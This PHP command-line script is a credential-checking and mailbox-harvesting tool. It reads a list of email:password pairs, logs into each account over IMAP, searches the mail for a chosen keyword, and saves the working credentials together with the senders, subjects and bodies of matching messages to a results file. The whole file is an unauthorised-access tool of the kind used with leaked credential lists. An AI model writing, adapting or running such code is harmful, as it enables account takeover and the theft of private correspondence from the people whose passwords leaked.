<?php

require_once "library.php";

$shortopts = "f:k:m::";
$options = getopt($shortopts);

if (!isset($options["f"]) || !isset($options["k"])){
	echo "Usage: checker.php -f PATH -k keyword -m (optional) mail to start from\n";
	die();
}

if (file_exists($options["f"])){
	$bn = basename($options["f"], ".txt");
	$handle = fopen($options["f"], "r");
	$result = fopen(__DIR__ . DIRECTORY_SEPARATOR . "results" . 
							  DIRECTORY_SEPARATOR . $bn . "_keyword_".$options["k"].".txt", "a");

	if (!isset($options["m"])){
		$flag = TRUE;
	} else {
		$flag = FALSE;
	}

	if ($handle && $result) {
	    while (($line = fgets($handle)) !== false) {
	    	$arr = split(":", $line);
	    	$email = $arr[0];
	    	$password = trim($arr[1]);

	    	$domain = split("@", $email)[1];

	    	if (isset($options["m"]) && !empty($options["m"])){
	    		if ($options["m"] === $email){
	    			$flag = TRUE;
	    		}
	    	}

	    	if($flag){

		    	debug($email);

		    	$stream = connectToImap($domain, $email, $password);

		    	if ($stream){

		    		debug("Connected to: " . $email);

		    		$text = imap_search($stream, 'TEXT "'. $options["k"] .'"');

		    		if (!empty($text)){

		    			$flag = false;

			    		foreach($text as $t){
			    			$o = imap_fetch_overview($stream, $t, 0);
			    			$o = $o[0];
			    			echo "EMAIL FOUND!!! " . date('m/d/Y h:i:s', strtotime($o->date) ). " ". imap_utf8($o->from) ." ". imap_utf8($o->subject) . "\n\n";

			    			debug("Writing keyword to file.");

			    			if(!$flag){
			    				fwrite($result, $email . ":" . $password . ":" . $options["k"] . "\n\n");
			    				$flag = true;
			    			}
			    			
			    			fwrite($result,  date('m/d/Y h:i:s', strtotime($o->date) ). " ". imap_utf8($o->from) ." ". imap_utf8($o->subject) . "\n\n");

			    			$body = imap_utf8(imap_fetchbody($stream, $t, 1.1));

			    			fwrite($result, $body . "\n\n");
			    		}
		    		}	
		    	}
		    }
	    }
	}

	fclose($handle);
	fclose($result);
}
?>
